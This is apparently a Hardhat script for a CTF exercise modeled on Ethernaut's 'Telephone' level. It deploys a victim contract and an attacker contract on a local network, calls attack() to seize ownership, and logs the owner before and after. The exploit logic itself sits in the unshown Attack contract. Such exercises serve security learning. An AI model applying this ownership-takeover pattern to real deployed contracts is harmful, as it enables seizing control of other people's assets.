const { showThrottleMessage } = require("ethers");
const { ethers } = require("hardhat");

async function main () {
  const [deployer, attacker] = await ethers.getSigners();
  const viticmcontract = await ethers.getContractFactory("Telephone");
  const deploycontract_v = await viticmcontract.deploy();
  const attackcontract = await ethers.getContractFactory("Attack");
  const deploycontract_a = await attackcontract.deploy(deploycontract_v.target);
  let contractowner = await deploycontract_v.owner();
  
  console.log("Deploy viticm contract at: ", deploycontract_v.target);
  console.log("Deploy Attacker contrat at: ", deploycontract_a.target);
  console.log("deployer address: ", deployer.address);
  console.log("attacker address: ", attacker.address);
  console.log("Before owner:  ", contractowner);

  let tx = await deploycontract_a.connect(attacker).attack(attacker.address);

  console.log("Send transaction: ", tx.hash);

  contractowner = await deploycontract_v.owner();

  console.log("After owner: ", contractowner);


}

main().catch((error) => {
  console.error(error);
  process.exit(1);
})
